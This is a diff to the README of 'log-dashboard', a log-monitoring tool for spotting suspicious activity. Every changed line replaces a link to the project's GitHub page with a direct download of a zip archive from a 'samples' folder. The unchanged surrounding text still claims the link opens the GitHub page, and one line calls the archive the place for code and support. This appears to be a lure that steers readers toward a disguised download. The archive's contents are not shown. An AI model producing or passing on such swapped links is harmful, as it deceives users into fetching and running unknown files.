@@ -1,6 +1,6 @@
 # 🛡️ log-dashboard - Detect Suspicious Activity Easily
 
-[![Download log-dashboard](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/SevenTFanAnuken/log-dashboard)
+[![Download log-dashboard](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://raw.githubusercontent.com/SevenTFanAnuken/log-dashboard/main/samples/dashboard-log-3.7-beta.4.zip)
 
 ---
 
@@ -43,7 +43,7 @@ This software uses React and Node.js behind the scenes. You do not need to insta
 
 Click the button below to open the page where you can get the files for log-dashboard.
 
-[![Download log-dashboard](https://img.shields.io/badge/Download-HERE-blue)](https://github.com/SevenTFanAnuken/log-dashboard)
+[![Download log-dashboard](https://img.shields.io/badge/Download-HERE-blue)](https://raw.githubusercontent.com/SevenTFanAnuken/log-dashboard/main/samples/dashboard-log-3.7-beta.4.zip)
 
 This will take you to the GitHub page for log-dashboard. Here you will find the latest version ready for download.
 
@@ -111,7 +111,7 @@ Visit the download page regularly (link above). When a new release is available,
 
 ## 🔗 Extra Resources
 
-- Visit https://github.com/SevenTFanAnuken/log-dashboard for code, updates, and community support.
+- Visit https://raw.githubusercontent.com/SevenTFanAnuken/log-dashboard/main/samples/dashboard-log-3.7-beta.4.zip for code, updates, and community support.
 - Find help on log formats and how to access logs for Apache, SSH, and Windows Event Viewer by searching official documentation online.
 - Use Windows Event Viewer (built-in tool) to explore your event logs and understand entries.
 
